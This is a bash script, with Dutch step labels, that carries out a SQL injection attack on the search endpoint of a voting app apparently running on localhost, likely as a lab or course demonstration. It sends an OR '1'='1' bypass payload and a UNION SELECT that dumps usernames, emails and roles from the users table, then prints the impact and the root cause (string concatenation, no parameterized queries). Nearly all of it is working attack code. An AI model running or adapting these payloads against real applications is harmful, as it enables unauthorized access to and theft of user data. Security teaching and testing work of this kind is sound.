#!/bin/bash
# SQL Injection Exploit - OMMA Voting App
# Target: /votes/search endpoint

BASE_URL="http://127.0.0.1:8080"

echo "=================================================="
echo "SQL INJECTION EXPLOIT - OMMA Voting App"
echo "Target: ${BASE_URL}/votes/search"
echo "=================================================="
echo ""

echo "[STAP 1] Legitieme zoekopdracht..."
echo "Command: curl \"${BASE_URL}/votes/search?username=john_doe\""
echo ""
curl -s "${BASE_URL}/votes/search?username=john_doe"
echo ""
echo "---"
echo ""

echo "[STAP 2] SQL Injection - OR bypass (alle votes)"
echo "Command: curl \"${BASE_URL}/votes/search?username=admin'+OR+'1'='1\""
echo "Payload: admin' OR '1'='1"
echo ""
curl -s "${BASE_URL}/votes/search?username=admin'+OR+'1'='1"
echo ""
echo "---"
echo ""

echo "[STAP 3] SQL Injection - UNION attack (user data)"
echo "Command: curl \"${BASE_URL}/votes/search?username='+UNION+SELECT+id,username,email,role+FROM+users--\""
echo "Payload: ' UNION SELECT id,username,email,role FROM users--"
echo ""
curl -s "${BASE_URL}/votes/search?username='+UNION+SELECT+id,username,email,role+FROM+users--"
echo ""
echo "---"
echo ""

echo "=================================================="
echo "EXPLOIT SUCCESVOL!"
echo ""
echo "IMPACT:"
echo "  - Alle votes uit database geÃ«xtraheerd"
echo "  - User data (emails, roles) blootgelegd"
echo "  - Authentication bypass mogelijk"
echo ""
echo "ROOT CAUSE:"
echo "  - String concatenation in SQL query"
echo "  - Geen parameterized queries"
echo "  - Geen input validatie"
echo "=================================================="

